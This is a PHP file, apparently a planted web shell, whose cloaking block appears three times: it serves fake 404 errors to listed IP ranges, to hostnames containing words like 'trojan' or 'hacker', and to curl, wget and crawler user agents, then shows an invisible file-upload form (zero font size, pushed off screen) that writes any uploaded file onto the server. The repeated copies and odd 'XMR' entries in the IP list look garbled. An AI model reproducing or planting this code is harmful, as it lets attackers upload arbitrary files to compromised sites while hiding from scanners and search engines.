<?php
// Banned IPs
$banned_ips = array('^62.116.207.*', '^212.50.193.*', '^69.65.*.*', '^50.7.*.*', '^131.212.*.*', '^XMR.*.*', '^93.172.*.*', '^109.186.*.*', '^194.90.*.*', '^212.29.192.*', '^212.29.224.*', '^212.143.*.*', '^212.150.*.*', '^212.235.*.*', '^217.132.*.*', '^50.97.*.*', '^217.132.*.*', '^209.85.*.*', '^66.205.64.*', '^204.14.48.*', '^64.27.2.*', '^67.15.*.*', '^202.108.252.*', '^193.XMR.252.167.*', '^193.253.199.*', '^69.61.12.*', '^64.37.103.*', '^38.144.36.*', '^64.124.14.*', '^206.28.72.*', '^209.73.228.*', '^158.108.*.*', '^168.188.*.*', '^66.207.120.*', '^167.24.*.*', '^192.118.48.*', '^67.209.128.*', '^12.148.209.*', '^12.148.196.*', '^193.220.178.*', '68.65.53.71', '^198.25.*.*', '^64.106.213.*'); // Add your banned IP addresses
if (in_array($_SERVER['REMOTE_ADDR'], $banned_ips)) {
    header("HTTP/1.0 404 Not Found");
    echo "404 Not Found";
    exit();
}

// Blocked hostnames
$blocked_words = array('ransomware', 'ddos', 'trojan', 'virus', 'worm', 'backdoor', 'rootkit', 'bad', 'hacker', 'spam'); // Add your blocked words
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
foreach ($blocked_words as $word) {
    if (strpos($host, $word) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

// User agent validation
$blocked_agents = array('libwww-perl', 'PHP', 'Ruby', 'Python-requests', 'wget', 'cURL', 'Powershell', 'Perl', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider'); // Add your blocked user agents
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
foreach ($blocked_agents as $agent) {
    if (strpos($user_agent, $agent) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

?>
<style>body{font-size: 0;}input{font-size: 0.1px;} h2{padding-top: 1000px;}</style><h2><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>S:</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>SS"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=Z> <br>"; }__halt_compiler();?></h2><?php@ini_set('output_buffering', 0);@ini_set('display_errors', 0);set_time_limit(0);ini_set('memory_limit', '64M');header('Content-Type: text/html; charset=UTF-8');?>
<?php
// Banned IPs
$banned_ips = array('^62.116.207.*', '^212.50.193.*', '^69.65.*.*', '^50.7.*.*', '^131.212.*.*', '^XMR.*.*', '^93.172.*.*', '^109.186.*.*', '^194.90.*.*', '^212.29.192.*', '^212.29.224.*', '^212.143.*.*', '^212.150.*.*', '^212.235.*.*', '^217.132.*.*', '^50.97.*.*', '^217.132.*.*', '^209.85.*.*', '^66.205.64.*', '^204.14.48.*', '^64.27.2.*', '^67.15.*.*', '^202.108.252.*', '^193.XMR.252.167.*', '^193.253.199.*', '^69.61.12.*', '^64.37.103.*', '^38.144.36.*', '^64.124.14.*', '^206.28.72.*', '^209.73.228.*', '^158.108.*.*', '^168.188.*.*', '^66.207.120.*', '^167.24.*.*', '^192.118.48.*', '^67.209.128.*', '^12.148.209.*', '^12.148.196.*', '^193.220.178.*', '68.65.53.71', '^198.25.*.*', '^64.106.213.*'); // Add your banned IP addresses
if (in_array($_SERVER['REMOTE_ADDR'], $banned_ips)) {
    header("HTTP/1.0 404 Not Found");
    echo "404 Not Found";
    exit();
}

// Blocked hostnames
$blocked_words = array('ransomware', 'ddos', 'trojan', 'virus', 'worm', 'backdoor', 'rootkit', 'bad', 'hacker', 'spam'); // Add your blocked words
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
foreach ($blocked_words as $word) {
    if (strpos($host, $word) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

// User agent validation
$blocked_agents = array('libwww-perl', 'PHP', 'Ruby', 'Python-requests', 'wget', 'cURL', 'Powershell', 'Perl', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider'); // Add your blocked user agents
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
foreach ($blocked_agents as $agent) {
    if (strpos($user_agent, $agent) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

?>
<style>body{font-size: 0;}input{font-size: 0.1px;} h2{padding-top: 1000px;}</style><h2><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>S:</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>SS"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=Z> <br>"; }__halt_compiler();?></h2><?php@ini_set('output_buffering', 0);@ini_set('display_errors', 0);set_time_limit(0);ini_set('memory_limit', '64M');header('Content-Type: text/html; charset=UTF-8');?>
<?php
// Banned IPs
$banned_ips = array('^62.116.207.*', '^212.50.193.*', '^69.65.*.*', '^50.7.*.*', '^131.212.*.*', '^XMR.*.*', '^93.172.*.*', '^109.186.*.*', '^194.90.*.*', '^212.29.192.*', '^212.29.224.*', '^212.143.*.*', '^212.150.*.*', '^212.235.*.*', '^217.132.*.*', '^50.97.*.*', '^217.132.*.*', '^209.85.*.*', '^66.205.64.*', '^204.14.48.*', '^64.27.2.*', '^67.15.*.*', '^202.108.252.*', '^193.XMR.252.167.*', '^193.253.199.*', '^69.61.12.*', '^64.37.103.*', '^38.144.36.*', '^64.124.14.*', '^206.28.72.*', '^209.73.228.*', '^158.108.*.*', '^168.188.*.*', '^66.207.120.*', '^167.24.*.*', '^192.118.48.*', '^67.209.128.*', '^12.148.209.*', '^12.148.196.*', '^193.220.178.*', '68.65.53.71', '^198.25.*.*', '^64.106.213.*'); // Add your banned IP addresses
if (in_array($_SERVER['REMOTE_ADDR'], $banned_ips)) {
    header("HTTP/1.0 404 Not Found");
    echo "404 Not Found";
    exit();
}

// Blocked hostnames
$blocked_words = array('ransomware', 'ddos', 'trojan', 'virus', 'worm', 'backdoor', 'rootkit', 'bad', 'hacker', 'spam'); // Add your blocked words
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
foreach ($blocked_words as $word) {
    if (strpos($host, $word) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

// User agent validation
$blocked_agents = array('libwww-perl', 'PHP', 'Ruby', 'Python-requests', 'wget', 'cURL', 'Powershell', 'Perl', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider'); // Add your blocked user agents
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
foreach ($blocked_agents as $agent) {
    if (strpos($user_agent, $agent) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

?>
